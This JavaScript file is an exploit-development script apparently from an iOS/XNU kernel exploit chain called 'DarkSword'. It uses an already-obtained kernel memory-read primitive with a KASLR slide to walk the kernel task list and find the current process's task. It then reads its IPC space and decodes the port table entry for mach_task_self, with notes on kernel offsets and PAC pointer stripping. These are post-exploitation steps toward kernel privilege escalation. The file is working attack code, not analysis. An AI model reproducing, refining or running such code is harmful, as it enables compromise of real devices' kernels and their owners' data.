// ipc_decode.js — Safely decode IPC space and find port objects
//
// Only reads from addresses we've CONFIRMED are valid in prior runs.
// No probing of unknown offsets.
//
// Known-good chain:
//   ourTask (confirmed) → +0x320 → ipc_space (confirmed readable)
//   ipc_space → +0x20 → is_table (confirmed: reads 0x7FFFFFFFFFFFFFFF)
//
// DarkSword offsets (from source code, NOT guessing):
//   ipcSpace = 0x318 (but we found working space at 0x320)
//   spaceTable = 0x20 (within ipc_space)
//   entryObject = 0x0 (ie_object is at start of ipc_entry)
//   objectKObject = 0x48 (within ipc_port)
//   entry_size = 0x18 (each ipc_entry is 24 bytes)
//   mach_port_index(port) = port >> 8

log('=== IPC Space Decode ===');

// Step 1: Find our task (safe — confirmed working)
var kt = kread64(slide('0xc1bf78'));
var task = kread64(add(kt, '0x30'));
var ourPid = getpid_native();
var ourTask;
for (var i = 0; i < 600; i++) {
  if (task == '0x0' || task == kt) break;
  var procRO = kread64(add(task, '0x3e0'));
  if (procRO == '0x0') { task = kread64(add(task, '0x30')); continue; }
  var proc = kread64(procRO);
  if (proc == '0x0' || proc.indexOf('0xffffff') != 0) { task = kread64(add(task, '0x30')); continue; }
  var p = parseInt(kread32(add(proc, '0x60')), 16);
  if (p == ourPid) { ourTask = task; break; }
  task = kread64(add(task, '0x30'));
}
log('ourTask = ' + ourTask);

// Step 2: Read ipc_space at task+0x320 (confirmed readable in prior run)
var ipcSpace = kread64(add(ourTask, '0x320'));
log('ipc_space (task+0x320) = ' + ipcSpace);

// Step 3: Read is_table at ipc_space+0x20 (confirmed: returns 0x7FFFFFFFFFFFFFFF)
var isTableRaw = kread64(add(ipcSpace, '0x20'));
log('is_table raw = ' + isTableRaw);

// Step 4: Apply kallocArrayDecodeAddr
// T1SZ_BOOT = 17 → KALLOC_ARRAY_TYPE_SHIFT = 46
// zone_mask = 1 << 46 = 0x400000000000
// If bit 46 is set → ptr &= ~0x1F (clear bottom 5 bits)
// Else → ptr &= ~PAGE_MASK; ptr |= zone_mask

// For 0x7FFFFFFFFFFFFFFF:
// bit 46 = 1 (all bits set)
// So: decoded = 0x7FFFFFFFFFFFFFFF & ~0x1F = 0x7FFFFFFFFFFFFFE0
// That's clearly not a kernel address. This means the encoding is different.

// ALTERNATIVE: maybe ipc_space is at 0x318 (DarkSword's offset), PAC-stripped
// Let me try both and see which gives a decodable table

// Try A: task+0x320 → space → space+0x20 → decode
log('');
log('--- Approach A: ipc_space at task+0x320 ---');
var spaceA = ipcSpace;  // Already read above
// The 0x7FFF... value might mean this is NOT the real table
// Maybe +0x20 is wrong for XNU 24.6

// Try reading space at several offsets to find the table
// Only read offsets that DarkSword also reads (0x20 confirmed, try 0x10, 0x28)
var v10 = kread64(add(spaceA, '0x10'));
var v20 = kread64(add(spaceA, '0x20'));
log('space+0x10 = ' + v10);  // This was 0xffffffdf01cd4000 in a prior run — a REAL pointer!
log('space+0x20 = ' + v20);  // This was 0x7FFFFFFFFFFFFFFF

// v10 looks like a real kernel pointer. Maybe THAT is the table on XNU 24.6
// (spaceTable offset changed from 0x20 to 0x10)
if (v10.indexOf('0xffffff') == 0) {
  log('');
  log('space+0x10 is a valid kernel pointer — likely the real is_table');

  // Try reading port 0x203 (mach_task_self) entry
  // index = 0x203 >> 8 = 2
  // entry_addr = table + 2 * 0x18 = table + 0x30
  var tableBase = v10;
  var entryAddr = add(tableBase, '0x30');  // index 2, stride 0x18
  log('Port 0x203 entry at: ' + entryAddr);

  // Read ie_object at entry + 0x0 (DarkSword: entryObject = 0x0)
  var portObject = kread64(entryAddr);
  log('ie_object (raw) = ' + portObject);

  // Strip PAC
  // DarkSword: strip(ptr) = ptr | 0xffffff8000000000
  // But we should also try the value as-is if it's already a kernel ptr
  if (portObject.indexOf('0xffffff') == 0) {
    log('ie_object is already a clean kernel pointer');
  } else {
    // Apply strip: OR with 0xffffff8000000000
    // We can't do BigInt easily, so let's check if it looks like a PAC ptr
    log('ie_object appears PAC-signed, need to strip');
    // For now, log it and we'll strip in a follow-up
  }

  // Also read entry+0x8 and entry+0x10 for context
  var ev8 = kread64(add(entryAddr, '0x8'));
  var ev10 = kread64(add(entryAddr, '0x10'));
  log('entry+0x8 = ' + ev8);
  log('entry+0x10 = ' + ev10);
}

log('');
log('=== Summary ===');
log('If ie_object can be stripped to a valid ipc_port, then:');
log('  ipc_port + 0x48 should give us the kobject (our task addr)');
log('  Expected kobject = ' + ourTask);

'ipc_decode_done';
